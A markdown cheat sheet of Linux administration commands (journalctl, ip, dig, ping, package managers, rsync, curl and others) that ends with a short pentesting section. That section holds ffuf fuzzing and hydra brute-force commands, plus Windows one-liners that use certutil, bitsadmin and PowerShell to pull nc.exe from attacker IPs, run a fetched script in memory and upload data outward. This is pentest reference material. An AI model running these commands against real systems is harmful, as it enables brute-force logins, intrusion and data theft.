### 🟡 4.3 Foreground & Background Jobs (&, bg, fg, jobs, disown, nohup, screen, tmux)



### 🟡 4.4 System Services (SysV/Systemd (service, chkconfig, systemctl, journalctl)

👉 **The `journalctl` command -** 

|                                 Command                                  |                                                        Effect                                                        |
| :----------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------: |
|                               `journalctl`                               |                                    Dumps the entire journal from oldest to newest                                    |
|                             `journalctl -e`                              |                                                Jump to end of journal                                                |
|                            `journalctl -n 50`                            |                                                  Show last 50 lines                                                  |
|                      `journalctl -n 50 --no-pager`                       |                                           Show last 50 lines without pager                                           |
|                             `journalctl -f`                              |                                              Follow all journal entries                                              |
|                       `journalctl -u demo.service`                       |                                            Logs for specific service only                                            |
|                     `journalctl -u demo.service -f`                      |                                              Follow a specific service                                               |
|                  `journalctl -u demo.service -f --utc`                   |                                            Follow with timestamps in UTC                                             |
|                `journalctl --since "2026-05-04 08:00:00"`                |                                           Logs since a specific timestamp                                            |
| `journalctl --since "2026-05-04 08:00:00" --until "2026-05-04 09:00:00"` |                                             Logs between two timestamps                                              |
|   `journalctl --since "1 hour ago"` / `journalctl --since "yesterday"`   |                                              Relative time expressions                                               |
|                         `journalctl -p [OPTION]`                         | Show entries at or above a specific severity (0-7). Options: `emerg, alert, crit, err, warning, notice, info, debug` |
|                        `journalctl --disk-usage`                         |                                           Check current journal disk usage                                           |
|                    `journalctl --vacuum-time=2weeks`                     |                                            Remove logs older than 2 weeks                                            |
|                     `journalctl --vacuum-size=500M`                      |                                      Reduce journal to a maximum size of 500MB                                       |
|                      `journalctl --vacuum-files=3`                       |                                          Keep only the last 3 boot sessions                                          |

📜 **Notes**:
- To make size limits permanent, edit `/etc/systemd/journald.conf` and set `SystemMaxUse=500M`, then restart the journal daemon with `systemctl restart systemd-journald`.

### 🟡 4.5 Scheduling (Cron & At) (crontab, at, atq, batch, anacron)

### 🟡 4.6 System Logging (logger, dmesg, /var/log, logrotate)

### 🟡 4.7 Process Limits & Cgroups (ulimit, cgroups, prlimit)


## 🟠 5. Connectivity Management

> Focus: Connectivity, routing, ports, tunneling, and remote access.

### 🟡 5.1 Interface & IP Configuration (ip, ifconfig, ethtool, nmcli, dhclient)

👉 **The `ip` command -** 

|            Command            |                                            Effect                                             |
| :---------------------------: | :-------------------------------------------------------------------------------------------: |
|        `ip addr show`         |                    Displays all network interfaces and their IP addresses                     |
|  `ip addr show dev [IFACE]`   |                   Displays specific network interface and their IP address                    |
| `ip link set [IFACE] up/down` |                            Enables/disables the network interface                             |
|        `ip route show`        |                                  Displays the routing table                                   |
|      `ip route add/del`       |  Adds or removes routes in the routing table e.g. <br>`ip route add default via 192.168.1.1`  |
|       `ip addr add/del`       | Adds or deletes IP addresses on an interface e.g. <br>`ip addr add 192.168.1.100/24 dev eth0` |
|         `ip -s link`          |      Displays detailed statistics for network interfaces e.g.<br>`ip -s link show wlo1`       |
|          `ip neigh`           |                       Displays or manipulates the ARP (neighbor) cache                        |

### 🟡 5.2 Routing & Gateway (route, ip route, traceroute, tracepath)

### 🟡 5.3 DNS & Name Resolution (dig, nslookup, host, resolvectl, /etc/hosts)


👉 **The `dig` command -** 

|             Command              |                                   Description                                    |
| :------------------------------: | :------------------------------------------------------------------------------: |
|    `dig @8.8.8.8 example.com`    |                        Specify which DNS server to query.                        |
|     `dig example.com +short`     |                 Provide a brief answer, only the answer section.                 |
|     `dig example.com +noall`     |                       Suppress all sections of the output.                       |
| `dig example.com +noall +answer` |                          Show only the answer section.                           |
|   `dig example.com -t <TYPE>`    | Specify the type of DNS record to query e.g. `MX`, `NS`, `A`, `TXT`, `SOA`, etc. |
|         `dig -x 8.8.8.8`         |                          Perform a reverse DNS lookup.                           |
|     `dig example.com +trace`     |              Trace the delegation path from the root name servers.               |
|    `dig example.com +dnssec`     |                             Request DNSSEC records.                              |
|   `dig example.com +multiline`   |                    Print records in an easier-to-read format.                    |
|     `dig example.com +stats`     |                       Display statistics about the query.                        |
|       `dig -4 example.com`       |                           Use IPv4 only for the query.                           |
|       `dig -6 example.com`       |                           Use IPv6 only for the query.                           |
|   `dig +nssearch example.com`    |                  Find authoritative name servers for a domain.                   |
|     `dig example.com +nocmd`     |                       Suppress the initial query comment.                        |
|   `dig example.com +norecurse`   |                     Set the recursion desired flag to `off`.                     |
|      `dig example.com +tcp`      |                       Use TCP instead of UDP for queries.                        |
|    `dig -f domains.txt +fail`    |                  Stop on failure when performing batch queries.                  |

👉 **The `nslookup` command -** 

|              Command              |                         Effect                          |
| :-------------------------------: | :-----------------------------------------------------: |
|      `nslookup example.com`       | Queries the default DNS server for the specified domain |
|  `nslookup example.com 8.8.8.8`   |      Queries a specific DNS server for the domain       |
|  `nslookup -type=mx example.com`  |         Queries the mail exchange (MX) records          |
|  `nslookup -type=ns example.com`  |          Queries the name server (NS) records           |
| `nslookup -type=txt example.com`  |       Queries the TXT (text) records for a domain       |
|   `nslookup -debug example.com`   |    Provides detailed debug output for the DNS query     |
| `nslookup -port=5353 example.com` |     Specifies a non-standard port for the DNS query     |

### 🟡 5.4 Connection Diagnostics (ping, mtr, netstat, ss, nmap, arp)

👉 **The `ping` command -** 

|              Command              |                                         Effect                                         |
| :-------------------------------: | :------------------------------------------------------------------------------------: |
|        `ping destination`         |                  Ping until you press Ctrl+C (default on most hosts)                   |
|      `ping -c 4 destination`      |                         Send a fixed number of probes and stop                         |
|      `ping -n 203.0.113.10`       |                 Skip reverse DNS — faster when you already have an IP                  |
|      `ping -H 203.0.113.10`       |                      Force reverse DNS even for numeric addresses                      |
|     `ping -i 0.5 destination`     |          Wait N seconds between packets (default 1; minimum 0.2 for non-root)          |
|     `ping -w 10 destination`      |              Stop after N seconds total (`deadline`) regardless of count               |
|      `ping -W 2 destination`      |                    Wait up to N seconds for each reply (`timeout`)                     |
|     `ping -s 100 destination`     | Change ICMP data payload size in bytes (default 56 → 64 bytes on the wire with header) |
|     `ping -t 32 destination`      |                            Set IP time-to-live (hop limit)                             |
|    `ping -q -c 5 destination`     |                           Print only start and summary lines                           |
|    `ping -D -c 3 destination`     |                      Prefix each reply line with a Unix timestamp                      |
|    `ping -O -c 3 destination`     |                   Report outstanding replies before the next packet                    |
|       `ping -4 destination`       |                                       Force IPv4                                       |
|       `ping -6 destination`       |                                       Force IPv6                                       |
|    `ping -I eth0 destination`     |                          Send probes out a specific interface                          |
|       `ping -f destination`       |                      Flood ping (root only; prints `.` per send)                       |
|   `ping -l 5 -c 10 destination`   |              Preload N packets while waiting for replies (root if N > 3)               |
| `ping -T tsonly -c 2 destination` |             IPv4 timestamp option (`tsonly`, `tsandaddr`, or `tsprespec`)              |
|    `ping -U -c 3 destination`     |                     Print user-to-user latency (includes DNS time)                     |


👉 **The `ss` command -** 

|  Command   |                         Effect                          |
| :--------: | :-----------------------------------------------------: |
|    `ss`    |      Displays all established network connections       |
|  `ss -t`   |               Shows only TCP connections                |
|  `ss -u`   |               Shows only UDP connections                |
|  `ss -l`   |      Displays listening sockets (both TCP and UDP)      |
|  `ss -p`   |          Displays processes using the sockets           |
|  `ss -r`   |           Resolves hostnames for IP addresses           |
|  `ss -s`   |           Displays socket summary statistics            |
|  `ss -n`   |       Shows addresses and ports in numeric format       |
| `ss -tuln` | Shows all listening TCP and UDP sockets in numeric form |
|  `ss -i`   |     Shows detailed socket information (TCP metrics)     |

### 🟡 5.5 Remote Access (SSH (ssh, sshd, ssh-keygen, ssh-copy-id, scp, sftp)

### 🟡 5.6 Firewall (Packet Filtering (iptables, nftables, ufw, firewalld, ip6tables)

### 🟡 5.7 Network File Sharing (mount.cifs, mount.nfs, smbclient, smbpasswd)

### 🟡 5.8 Tunneling & VPN (openvpn, wireguard, ssh -L/-R, socat, netcat)


## 🟠 6. Software Management

> Focus: Installing, updating, removing, and auditing software.

### 🟡 6.1 Debian (apt, apt-get, apt-cache, dpkg, gdebi)

### 🟡 6.2 RedHat (dnf, yum, rpm, rpmbuild, yum-utils)

👉 **The `dnf` command -** 

|           Command           |                                    Effect                                    |
| :-------------------------: | :--------------------------------------------------------------------------: |
|   `dnf install <package>`   |                            Install a new package                             |
|        `dnf update`         |             Update all installed packages to the latest version              |
|        `dnf upgrade`        |            Similar to update, but also handles obsolete packages             |
|   `dnf remove <package>`    |                       Remove a package from the system                       |
|    `dnf list installed`     |                         List all installed packages                          |
|    `dnf list available`     |                 List all available packages in repositories                  |
|   `dnf search <keyword>`    |                     Search for a package using a keyword                     |
|    `dnf info <package>`     |                   Get detailed information about a package                   |
|       `dnf clean all`       |                         Clean up the cache directory                         |
|      `dnf autoremove`       | Remove packages that were installed as dependencies but are no longer needed |
|        `dnf history`        |                         Show the transaction history                         |
|  `dnf downgrade <package>`  |                  Downgrade a package to an earlier version                   |
|      `dnf group list`       |                           List all package groups                            |
| `dnf group install <group>` |                       Install all packages in a group                        |
| `dnf group remove <group>`  |                        Remove all packages in a group                        |
|       `dnf repolist`        |                   Display the list of enabled repositories                   |
|    `dnf provides <file>`    |                 Find which package provides a specific file                  |
|     `dnf check-update`      |             Check for available updates without installing them              |

### 🟡 6.3 Arch (pacman, yaourt, yay, makepkg)

### 🟡 6.4 SUSE (zypper, rpm)

👉 **The `zypper` command -** 

|            Command            |                   Effect                    |
| :---------------------------: | :-----------------------------------------: |
|       `zypper refresh`        |          Refreshes repository data          |
|        `zypper update`        |       Updates all installed packages        |
| `zypper install PACKAGE_NAME` |        Installs a specified package         |
| `zypper remove PACKAGE_NAME`  |         Removes a specified package         |
| `zypper search PACKAGE_NAME`  | Searches for a package in the repositories  |
|  `zypper info PACKAGE_NAME`   |    Displays detailed package information    |
|     `zypper list-updates`     |  Lists all packages with available updates  |
|     `zypper dist-upgrade`     |       Performs a distribution upgrade       |
|        `zypper clean`         |      Cleans up cached repository data       |
|  `zypper addrepo URL ALIAS`   |       Adds a new software repository        |
|   `zypper removerepo ALIAS`   |        Removes a software repository        |
|        `zypper repos`         | Lists all currently configured repositories |

### 🟡 6.5 Snap & Flatpak (Universal) (snap, flatpak)

### 🟡 6.6 Compiling from Source (./configure, make, make install, ldconfig)

### 🟡 6.7 Repository Management (add-apt-repository, yum-config-manager, repolist)


## 🟠 7. Performance Management

> Focus: Kernel parameters, hardware info, load averages, and debugging.

### 🟡 7.1 System Info & Uptime (sar, watch, uname, uptime, hostname/hostnamectl, dmidecode, lscpu, date)

👉 **The `sar` command -** 

|          Command          |                    Effect                     |
| :-----------------------: | :-------------------------------------------: |
|       `sar -u 2 5`        |  Displays CPU usage every 2 seconds, 5 times  |
|       `sar -r 2 5`        |      Displays memory and swap statistics      |
|       `sar -d 2 5`        |   Displays block device activity (disk I/O)   |
|     `sar -n DEV 2 5`      |      Displays network device statistics       |
|       `sar -b 2 5`        |    Shows I/O and transfer rate statistics     |
|       `sar -q 2 5`        |        Displays system load statistics        |
|       `sar -W 2 5`        |           Reports swapping activity           |
|       `sar -S 2 5`        |           Displays swap space usage           |
| `sar -f /var/log/sa/sa01` | Displays historical `sar` data from log files |

👉 **The `watch` command -** 

|            Command             |                                     Effect                                     |
| :----------------------------: | :----------------------------------------------------------------------------: |
|       `watch [command]`        |       Runs the specified command and updates the display every 2 seconds       |
| `watch -n [seconds] [command]` | Runs the command and updates the output at the specified interval (in seconds) |
|      `watch -d [command]`      |             Highlights the differences between successive updates              |

👉 **The `uname` command -** 

|  Command   |                  Effect                   |
| :--------: | :---------------------------------------: |
|  `uname`   |         Displays the kernel name          |
| `uname -a` | Displays all available system information |
| `uname -s` |         Displays the kernel name          |
| `uname -n` |    Displays the network node hostname     |
| `uname -r` |    Displays the kernel release version    |
| `uname -v` |        Displays the kernel version        |
| `uname -m` |    Displays the machine hardware name     |
| `uname -p` |  Displays the processor type (if known)   |
| `uname -i` | Displays the hardware platform (if known) |
| `uname -o` |    Displays the operating system name     |

👉 **The `hostname/hostnamectl` command** - 

|                      Command                      |                   Effect                    |
| :-----------------------------------------------: | :-----------------------------------------: |
|                    `hostname`                     |        Display the current hostname         |
|                   `hostname -f`                   | Show the fully qualified domain name (FQDN) |
|                   `hostname -s`                   |         Display the short hostname          |
|                   `hostname -I`                   |      Display all network IP addresses       |
|                   `hostname -d`                   |          Show the domain name part          |
|                   `hostname -i`                   |    Print the IP address of the hostname     |
|              `hostname newhostname`               |       Temporarily set a new hostname        |
|                   `hostnamectl`                   |        Show system hostname details         |
|              `hostnamectl hostname`               |         Print the current hostname          |
|              `hostnamectl --static`               |          Print the static hostname          |
|   `hostnamectl --static hostname web-server-01`   |        Set only the static hostname         |
|       `hostnamectl hostname web-server-01`        |           Set all hostname types            |
|  `hostnamectl --pretty hostname "Web Server 01"`  |            Set a pretty hostname            |
| `hostnamectl --transient hostname temporary-node` |         Set the transient hostname          |
|           `hostnamectl chassis server`            |            Set the chassis type             |
|        `hostnamectl deployment production`        |       Set the deployment environment        |
|         `hostnamectl -H user@host status`         |             Query a remote host             |

👉 **The `date` command -** 

|              Command               |                             Effect                              |
| :--------------------------------: | :-------------------------------------------------------------: |
|               `date`               |                Display the current date and time                |
|          `date +%Y-%m-%d`          |          Display the current date in YYYY-MM-DD format          |
|             `date +%T`             |           Display the current time in HH:MM:SS format           |
|             `date +%A`             |                  Display the full weekday name                  |
|             `date +%B`             |                   Display the full month name                   |
|             `date +%s`             |   Display the number of seconds since 1970-01-01 00:00:00 UTC   |
|      `date --utc` / `date -u`      |            Display the current date and time in UTC.            |
|      `date --date="tomorrow"`      |                  Display the date for tomorrow                  |
| `date --set="2023-12-31 23:59:59"` |                  Set the system date and time                   |
|           `date +%F_%T`            | Display the current date and time in YYYY-MM-DD_HH:MM:SS format |
|         `date +"Week: %V"`         |                   Display the ISO week number                   |
|             `date +%Z`             |                    Display the timezone name                    |
|             `date +%j`             |                   Display the day of the year                   |
|     `date --rfc-3339=seconds`      |    Display the date and time in RFC 3339 format with seconds    |
|             `date +%c`             |        Display the date and time in the locale’s format         |

### 🟡 7.2 Kernel Modules (lsmod, modprobe, insmod, rmmod, depmod)

### 🟡 7.3 Memory Usage (free, vmstat, pmap, smem, /proc/meminfo)

### 🟡 7.4 CPU Performance (time, mpstat, turbostat, nproc, taskset)

👉 **The `time` command -** 

|          Command          |                             Effect                              |
| :-----------------------: | :-------------------------------------------------------------: |
|      `time command`       |      Measures the execution time of the specified command       |
|     `time -p command`     |                Outputs the time in POSIX format                 |
|  `time -o FILE command`   |            Redirects the output to a specified file             |
| `time -f FORMAT command`  |      Formats the output according to the specified format       |
|     `time -v command`     | Provides verbose output, including more detailed timing metrics |
| `time -a -o FILE command` |            Appends the output to the specified file             |

### 🟡 7.5 System Tuning (/proc & sysctl) (sysctl, /proc/sys, tuned-adm)

### 🟡 7.6 Hardware Discovery (lspci, lsusb, lshw, lsscsi, hdparm)


👉 **The `lspci` command -** 

|         Command         |                                                             Effect                                                              |
| :---------------------: | :-----------------------------------------------------------------------------------------------------------------------------: |
|         `lspci`         |                  Lists every device on the PCI/PCIe buses with vendor, model, slot, and kernel-driver bindings                  |
|       `lspci -v`        |                                        Use `-v`, `-vv`, or `-vvv` for progressive detail                                        |
|       `lspci -k`        |               The `-k` flag exposes which driver claims each device — gold for debugging missing or wrong drivers               |
|       `lspci -nn`       | The `-nn` flag includes the [vendor:device] hex IDs alongside text names — essential for searching kernel docs and bug trackers |
|       `lspci -t`        |                            The `-t` output shows bus topology — which devices hang off which bridge                             |
| `lspci -d [V]:[D]:[CC]` |                                                  Filter by vendor/device/class                                                  |

👉 **The `lsusb` command -** 

|        Command         |                                                             Effect                                                              |
| :--------------------: | :-----------------------------------------------------------------------------------------------------------------------------: |
|        `lsusb`         | Lists USB devices connected to the system, including controllers, hubs, and end-devices, with vendor, product, and bus position |
|       `lsusb -t`       |         The `-t` flag is the most useful option — it shows topology, USB speed, and the bound kernel driver per device          |
| `lsusb -s [BUS]:[DEV]` |                                                 Filter by bus and device number                                                 |
|     `lsusb -d V:P`     |                                                 Filter by vendor:product (hex)                                                  |

👉 **The `lshw` command -** 

|               Command                |                                                                            Effect                                                                            |
| :----------------------------------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------: |
|                `lshw`                |                            Produces a detailed hardware inventory covering CPU, memory, disks, network, USB, and PCI in one tree                             |
|            `lshw -short`             |                                  The fastest readable view; one line per device with H/W path, name, class, and description                                  |
|        `lshw -class network`         | Use `-class` (or `-C`) to limit output to a single category. Common classes: `system`, `processor`, `memory`, `network`, `disk`, `display`, `storage`, `bus` |
|     `lshw -html > hardware.html`     |                                                         Use `-html` or `-json` for structured output                                                         |
| `lshw -sanitize > lshw-redacted.txt` |                      Hardware bug reports often need full output but should not leak serials. `-sanitize` redacts sensitive identifiers                      |
|           `lshw -businfo`            |                                                             Every device shows its bus location                                                              |

### 🟡 7.7 System Dumps & Crash (kexec, crash, systemd-coredump)


## 🟠 8. Backup Management

> Focus: Protecting data, snapshots, and incremental backups.

### 🟡 8.1 Disk-to-Disk Copy (dd, dcfldd, pv)

### 🟡 8.2 Remote Incremental Sync (rsync, rdiff-backup, duplicity)

👉 **The `rsync` command -** 

|                        Command                        |                                                                       Effect                                                                       |
| :---------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------: |
|           `rsync -avz source/ destination/`           | Synchronizes the contents of the `source/` directory with `destination/` recursively, preserving attributes, and compressing data during transfer. |
|      `rsync -avz --delete source/ destination/`       |               Mirrors the `source/` directory to `destination/`, deleting files in `destination/` that no longer exist in `source/`.               |
| `rsync -av --progress file.txt remote:~/destination/` |                          Copies `file.txt` to a remote server’s `~/destination/` directory with detailed progress output.                          |
|  `rsync -avz -e 'ssh' local/ remote:~/destination/`   |                         Uses `ssh` for secure transfer, synchronizing `local/` with the remote `~/destination/` directory.                         |
|       `rsync -a --dry-run source/ destination/`       |                             Performs a trial run without making any changes to show what files would be synchronized.                              |

### 🟡 8.3 System Snapshots (Linux) (timeshift, snapper)

### 🟡 8.4 Version Control (CLI) (git, svn, cvs)

### 🟡 8.5 Backup Compression (bzip2, pigz, pbzip2 - _parallel_)

### 🟡 8.6 Archive Verification (cksum, md5sum, sha256sum, gpg --verify)


## 🟠 9. Security Management

> Focus: SELinux, AppArmor, certificates, and access auditing.

### 🟡 9.1 Mandatory Access Control (SELinux) (getenforce, setenforce, chcon, restorecon, semanage, sealert)

### 🟡 9.2 AppArmor (aa-status, aa-enforce, aa-complain, aa-logprof)

### 🟡 9.3 Certificate & Key Management (openssl, keytool, certbot, update-ca-certificates)

### 🟡 9.4 Password & Hash Generation (mkpasswd, openssl passwd, pwgen)

### 🟡 9.5 File Integrity Checking (aide, tripwire, debsums, rpm -Va)
 
### 🟡 9.6 Process Auditing (auditd, ausearch, aureport)

### 🟡 9.7 Privilege Delegation (sudoers, doas, policykit)


## 🟠 10. Shell Management

> Focus: Your immediate working environment, history, and keybindings.

### 🟡 10.1 Terminal Control (clear, reset, stty, tty, script, cal)

👉 **The `cal` command -** 

|       Command        |                       Effect                        |
| :------------------: | :-------------------------------------------------: |
|        `cal`         |             Displays the current month              |
| `cal [MONTH] [YEAR]` | Displays the calendar for a specific month and year |
|       `cal -y`       |      Displays the calendar for the entire year      |
|   `cal -m [MONTH]`   |            Displays the specified month             |
|       `cal -3`       |   Displays the previous, current, and next month    |
|       `cal -j`       |        Shows Julian dates (day of the year)         |

### 🟡 10.2 History Management (history, fc, !!, !$, Ctrl+R)
### 🟡 10.3 Aliases & Functions (alias, unalias, declare, export -f)

### 🟡 10.4 Shell Job Control (suspend, kill -STOP, wait)

### 🟡 10.5 Environment Variables (printenv, set, unset, export)

### 🟡 10.6 Text Editors (vim, nano, emacs -nw, ed, sed)

👉 **The `nano` command -** 

|       Command        |                            Effect                            |
| :------------------: | :----------------------------------------------------------: |
|  `nano myfile.txt`   | Opens the file for editing or creates it if it doesn’t exist |
| `nano -m myfile.txt` |                    Enables mouse support                     |
| `nano -i myfile.txt` |                Enables automatic indentation                 |
| `nano -B myfile.txt` |         Creates a backup of the file before editing          |
| `nano -w myfile.txt` |                    Disables line wrapping                    |
| `nano -v myfile.txt` |               Opens the file in read-only mode               |

## 🟠 11. Automation Management

> Focus: Glue logic, API calls, data transformation, and repeatable tasks.

### 🟡 11.1 Data Extraction (jq, yq, csvkit, xmlstarlet)

### 🟡 11.2 Batch Execution (echo, yes, xargs, parallel, for/while loops in bash)

👉 **The `echo` command -** 

|             Command             |                           Effect                           |
| :-----------------------------: | :--------------------------------------------------------: |
|          `echo "text"`          |                   Display text or string                   |
|        `echo -n "text"`         |           Display text without trailing newline            |
|       `echo -e "\ntext"`        |         Enable interpretation of backslash escapes         |
|        `echo -E "text"`         |   Disable interpretation of backslash escapes (default)    |
|        `echo $VARIABLE`         |              Display the value of a variable               |
|            `echo *`             | Display all files and directories in the current directory |
|       `echo "$(command)"`       |              Display the output of a command               |
|      `echo "text" > file`       |           Redirect output to a file (overwrites)           |
|      `echo "text" >> file`      |                  Append output to a file                   |
|       `echo -e "\ttext"`        |                     Insert a tab space                     |
|       `echo -e "\btext"`        |                     Insert a backspace                     |
|         `echo -e "\a"`          |                   Produce an alert sound                   |
| `echo -e "\033[31mtext\033[0m"` |                 Display text in red color                  |
|       `echo -e "\u263A"`        |                 Display Unicode character                  |
|       `echo -e "text\c"`        |                  Suppress further output                   |

👉 **The `yes` command -** 

|        Command        |                 Effect                  |
| :-------------------: | :-------------------------------------: |
|         `yes`         |         Outputs “y” repeatedly          |
|    `yes [STRING]`     | Outputs the specified string repeatedly |
| `yes [STRING] > file` |  Writes the repeated string to a file   |

### 🟡 11.3 HTTP Requests (curl, wget, httpie, lynx)

👉 **The `curl` command -** 

|                            Command                            |                     Effect                     |
| :-----------------------------------------------------------: | :--------------------------------------------: |
|            `curl -o file.html http://example.com`             |               Outputs to a file                |
|            `curl -O http://example.com/file.html`             |          Saves with original filename          |
|                 `curl -L http://example.com`                  |               Follows redirects                |
|                 `curl -I http://example.com`                  |              Fetches headers only              |
|               `curl -X POST http://example.com`               |             Specifies HTTP method              |
|          `curl -d "param=value" http://example.com`           |                Sends POST data                 |
| `curl -H "Content-Type: application/json" http://example.com` |                  Adds headers                  |
|          `curl -u user:password http://example.com`           | Specifies user and password for authentication |
|                 `curl -k https://example.com`                 |        Allows insecure SSL connections         |
|          `curl --limit-rate 100k http://example.com`          |              Limits transfer rate              |
|            `curl --compressed http://example.com`             |          Requests compressed response          |
|   `curl --data-urlencode "param=value" http://example.com`    |         Encodes data for POST requests         |
|      `curl -F "file=@/path/to/file" http://example.com`       |            Uploads files with POST             |
|          `curl -C - -O http://example.com/file.zip`           |        Resumes a previous file transfer        |
|                 `curl -s http://example.com`                  |     Runs in silent mode (no progress bar)      |
|          `curl -w "%{http_code}" http://example.com`          |             Displays custom output             |
|  `curl -Z http://example.com/file1 http://example.com/file2`  |           Enables parallel transfers           |

👉 **The `wget` command -** 

|                               Command                                |                         Effect                          |
| :------------------------------------------------------------------: | :-----------------------------------------------------: |
|                  `wget http://example.com/file.zip`                  |         Downloads a file from the specified URL         |
|           `wget -O output.txt http://example.com/file.zip`           |         Saves the file with the specified name          |
|                `wget -c http://example.com/file.zip`                 |        Resumes a previously interrupted download        |
|               `wget -r http://example.com/directory/`                |       Recursively downloads files and directories       |
|                `wget -b http://example.com/file.zip`                 |          Downloads the file in the background           |
|         `wget --limit-rate=200k http://example.com/file.zip`         |                Limits the download speed                |
| `wget --user=admin --password=1234 http://example.com/protected.zip` | Downloads from a site that requires HTTP authentication |
|             `wget --spider http://example.com/file.zip`              |  Checks if the URL exists without downloading the file  |
|                `wget -q http://example.com/file.zip`                 |        Downloads quietly without showing output         |
|                        `wget -i filelist.txt`                        |          Downloads files listed in a text file          |

### 🟡 11.4 Process Substitution (<(), >(), tee)


👉 **The `tee` command -** 

|               Command                |                         Effect                          |
| :----------------------------------: | :-----------------------------------------------------: |
|      'command \| tee file.txt'       | Writes output to a file and displays it in the terminal |
| 'command \| tee file1.txt file2.txt' |     Writes output to multiple files simultaneously      |
|     'command \| tee -a file.txt'     |    Appends the output to a file without overwriting     |
|     'command \| tee >(command2)'     | Sends the output to another command while displaying it |

### 🟡 11.5 System Hooks (Inotify) (inotifywait, inotifywatch)

### 🟡 11.6 Regex & Pattern Matching (sed -r, awk, perl -pe)


# 🔴 Pentesting Arsenal

## 🟠 Reconnaissance

### 🟡 ffuf

|                                         Command                                          |                        Description                         |
| :--------------------------------------------------------------------------------------: | :--------------------------------------------------------: |
|                     `ffuf -u http://target.com/FUZZ -w wordlist.txt`                     |                  Basic directory fuzzing                   |
|         `ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak`         |                 Fuzz with file extensions                  |
|      `ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2`      |        Recursive directory fuzzing (2 levels deep)         |
|                 `ffuf -u http://target.com/api/FUZZ -w /api/objects.txt`                 |                   API endpoint discovery                   |
|               `ffuf -u "http://target.com/page?FUZZ=value" -w params.txt`                |                  Fuzz GET parameter names                  |
|                `ffuf -u "http://target.com/page?id=FUZZ" -w LFI-list.txt`                |                Fuzz parameter value for LFI                |
|          `ffuf -u http://target.com/page -X POST -d "FUZZ=value" -w params.txt`          |                 Fuzz POST parameter names                  |
|         `ffuf -u http://target.com/page -X POST -d "user=FUZZ" -w usernames.txt`         |      Fuzz POST parameter value (username enumeration)      |
|          `ffuf -u "http://target.com/page?id=FUZZ" -w numbers.txt -mr "admin"`           |          Match response containing "admin" string          |
|        `ffuf -u http://10.10.10.10 -H "Host: FUZZ.target.com" -w subdomains.txt`         |               VHost fuzzing via Host header                |
|   `ffuf -u http://10.10.10.10 -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0,4242`   |          VHost fuzzing — filter by response size           |
|                    `ffuf -u http://FUZZ.target.com -w subdomains.txt`                    | Subdomain fuzzing via URL (requires DNS wildcard handling) |
|       `ffuf -u http://target.com/FUZZ -w wordlist.txt -H "Cookie: session=abc123"`       |                 Add authentication cookie                  |
|    `ffuf -u http://target.com/FUZZ -w wordlist.txt -H "Authorization: Bearer eyJ..."`    |                      Add Bearer token                      |
|        `ffuf -u http://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080`         |                  Proxy through Burp Suite                  |
|      `ffuf -u http://target.com/FUZZ -w wordlist.txt -H "User-Agent: Mozilla/5.0"`       |                     Custom User-Agent                      |
|                 `ffuf -u http://target.com/FUZZ -w wordlist.txt -t 100`                  |          Use 100 concurrent threads (default: 40)          |
|        `ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.json -of json`         |                    Save results as JSON                    |
| `ffuf -w user.txt:USER -w pass.txt:PASS -u https://target.com/login?user=USER&pass=PASS` |                Multiple parameters fuzzing                 |

## 🟠 Credential Access

### 🟡 hydra

|                                                           Command                                                           |                   Description                    |
| :-------------------------------------------------------------------------------------------------------------------------: | :----------------------------------------------: |
|                                       `hydra -f -l <USER> -P <PASS_LIST> ssh://<IP>`                                        |            SSH brute force (password)            |
|                                     `hydra -f -L <USER_LIST> -p <PASSWORD> ssh://<IP>`                                      |            SSH brute force (username)            |
|                                       `hydra -f -l <USER> -P <PASS_LIST> ftp://<IP>`                                        |                 FTP brute force                  |
|                                    `hydra -f -l <USER> -P <PASS_LIST> <SERVICE>://<IP>`                                     | **Services**: rdp, winrm, mysql, vnc, smtp, etc. |
|                               `hydra -l "cn=user,dc=example,dc=com" -P pass.txt ldap://<IP>`                                |                 LDAP brute force                 |
|               `hydra -l <USER> -P <PASS_LIST> <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"`               |    HTTP POST form - failure string detection     |
|          `hydra -l <USER> -P <PASS_LIST> -s <PORT> <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"`          |          HTTP form on non-standard port          |
|               `hydra -l <USER> -P <PASS_LIST> <IP> http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome"`               |    HTTP POST form - success string detection     |
|                `hydra -l <USER> -P <PASS_LIST> <IP> http-get-form "/login:user=^USER^&pass=^PASS^:F=error"`                 |            HTTP GET form brute force             |
| `hydra -l <USER> -P <PASS_LIST> <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid:H=Cookie\: PHPSESSID=abc123"` |        HTTP POST form with session cookie        |
|             `hydra -l <USER> -P <PASS_LIST> https-post-form "target.com/login:user=^USER^&pass=^PASS^:F=error"`             |                 HTTPS POST form                  |
|       `hydra -l <USER> -P <PASS_LIST> -u https://target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=error"`        |               HTTPS with full URL                |


# 🔴 File Transfer Cheat Sheet

|                                                      Command                                                       |                 Description                 |
| :----------------------------------------------------------------------------------------------------------------: | :-----------------------------------------: |
|                        `certutil -urlcache -split -f http://10.10.14.5:8000/nc.exe nc.exe`                         |       Download a file using Certutil        |
|                           `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                            |       Download a file using Certutil        |
|                           `powershell iwr http://10.10.14.5:8000/nc.exe -OutFile nc.exe`                           |       Download a file with PowerShell       |
|                      ` Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                      |       Download a file with PowerShell       |
|             `powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/p.ps1')`              |  Execute a file in memory using PowerShell  |
|                      `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                       |        Upload a file with PowerShell        |
|                                         `copy \\10.10.14.5\share\nc.exe .`                                         |          Copy from your SMB share           |
|               `bitsadmin /transfer myDownloadJob http://10.10.14.5:8000/f.exe C:\Windows\Temp\f.exe`               |       Download a file using Bitsadmin       |
